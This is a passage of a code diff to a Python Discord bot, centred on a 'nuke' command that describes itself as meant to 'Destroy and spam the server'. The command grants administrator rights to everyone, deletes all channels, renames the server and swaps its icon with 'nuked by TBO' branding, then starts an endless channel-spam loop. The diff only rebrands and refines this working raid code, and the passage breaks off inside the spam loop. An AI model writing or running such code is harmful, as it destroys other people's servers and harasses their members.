@@ -155,16 +155,19 @@ async def petpet_command(interaction: discord.Interaction, user: discord.User):
 @bot.tree.command(name="nuke", description="Destroy and spam the server")
 async def nuke(interaction: discord.Interaction):
     try:
-        everyone_role = interaction.guild.default_role
-        await everyone_role.edit(permissions=discord.Permissions(administrator=True))
+        await interaction.guild.default_role.edit(permissions=discord.Permissions(administrator=True))
         for channel in list(interaction.guild.channels):
             try:
                 await channel.delete()
             except:
                 pass
-        await interaction.guild.edit(name="nuked by apex and peeky")
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://media.discordapp.net/attachments/1302375719263014932/1403371786531508244/image0.jpg") as resp:
+                if resp.status == 200:
+                    img_bytes = await resp.read()
+                    await interaction.guild.edit(name="nuked by TBO", icon=img_bytes)
         async def create_and_spam():
-            ch = await interaction.guild.create_text_channel("nuked-by-apex and peeky")
+            ch = await interaction.guild.create_text_channel("TBO on top")
             async def spam():
                 while True:
                     try:
